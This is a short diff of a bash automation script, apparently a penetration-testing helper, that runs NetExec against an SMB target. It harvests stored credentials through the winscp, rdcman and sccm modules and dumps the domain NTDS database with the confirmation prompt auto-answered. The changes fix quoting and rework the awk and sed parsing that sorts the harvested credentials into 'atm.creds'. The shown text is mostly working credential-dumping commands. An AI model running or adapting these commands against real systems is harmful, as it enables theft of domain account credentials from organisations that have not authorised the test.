@@ -82,11 +82,11 @@ run_nxc nxc smb "$TARGET" $AUTH_ARGS -M winscp
 run_nxc nxc smb "$TARGET" $AUTH_ARGS -M rdcman
 run_nxc nxc smb "$TARGET" $AUTH_ARGS --sccm
 log "Running: nxc smb $TARGET $AUTH_ARGS --ntds"
-script -efqa "$CRED_FILE" -c 'printf "Y\n" | nxc smb $TARGET $AUTH_ARGS --ntds'
+script -efqa "$CREDFILE" -c "printf 'Y\n' | nxc smb $TARGET $AUTH_ARGS --ntds"
 
 # ──────── Extraction & Sorting ────────
 log "Extracting potential credential lines…"
-awk -F '        ' '{print $NF}' $CRED_FILE | rg -a '^\x1b\[1;33m' | sed -r 's/\x1b\[[0-9;]*m//g' | sort -u > "atm.creds"
+awk '{for (i=5; i<=NF; i++) printf $i (i<NF ? OFS : ORS)}' $CREDFILE | rg -a '^\x1b\[1;33m' | sed -r 's/\x1b\[[0-9;]*m//g' | sort -u > "atm.creds"
 
 echo -e "${GREEN}[✓] Raw output:        ${OUTDIR}/atm.log"
 echo -e "${GREEN}[✓] Unique credentials: ${OUTDIR}/atm.creds"
